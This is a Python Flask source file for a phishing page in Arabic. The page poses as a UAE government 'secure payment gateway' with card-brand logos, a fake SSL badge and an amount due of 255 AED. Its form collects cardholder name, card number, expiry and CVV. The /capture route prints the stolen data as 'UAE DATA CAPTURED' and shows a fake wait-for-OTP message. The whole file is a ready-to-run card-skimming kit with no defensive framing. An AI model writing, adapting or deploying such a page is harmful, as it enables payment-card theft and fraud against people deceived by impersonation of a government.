import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# تصميم بوابة دفع إماراتية احترافية
UAE_PAYMENT_UI = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع الرقمية - دولة الإمارات</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; margin: 0; display: flex; justify-content: center; padding-top: 40px; }
        .container { width: 90%; max-width: 450px; background: white; border-radius: 12px; shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #e1e1e1; }
        .header { background: #005a3c; color: white; padding: 20px; text-align: center; font-size: 18px; font-weight: bold; }
        .logos { display: flex; justify-content: space-around; align-items: center; padding: 15px; background: #fff; border-bottom: 1px solid #eee; }
        .logos img { height: 30px; }
        .content { padding: 25px; }
        .amount-box { background: #fff9e6; border: 1px dashed #ffcc00; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; }
        .amount-box span { color: #d32f2f; font-weight: bold; font-size: 20px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        .pay-btn { background: #005a3c; color: white; width: 100%; padding: 15px; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .footer-icons { text-align: center; padding: 15px; opacity: 0.6; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">بوابة الدفع الآمنة - حكومة الإمارات</div>
        <div class="logos">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Visa_Debit_logo.svg/2560px-Visa_Debit_logo.svg.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Google_Pay_%28GPay%29_Logo.svg">
        </div>
        <div class="content">
            <div class="amount-box">
                إجمالي المبلغ المستحق: <br> <span>255.00 درهم إماراتي (AED)</span>
            </div>
            <form action="/capture" method="post">
                <label>اسم حامل البطاقة</label>
                <input type="text" name="name" placeholder="الاسم كما هو مكتوب على البطاقة" required>
                <label>رقم البطاقة</label>
                <input type="text" name="card" placeholder="0000 0000 0000 0000" maxlength="16" required>
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="exp" placeholder="MM/YY" maxlength="5" required>
                    <input type="text" name="cvv" placeholder="CVV" maxlength="3" required>
                </div>
                <button type="submit" class="pay-btn">تأكيد الدفع والإنهاء</button>
            </form>
        </div>
        <div class="footer-icons">
             قفل أمان 🔒 تشفير بمعيار SSL 256-bit
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(UAE_PAYMENT_UI)

@app.route('/capture', methods=['POST'])
def capture():
    print(f"!!! UAE DATA CAPTURED: {request.form.to_dict()} !!!")
    return "<h2>جاري التحقق من عملية الدفع...</h2><p>يرجى الانتظار، سيصلك رمز التحقق (OTP) على هاتفك قريباً.</p>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
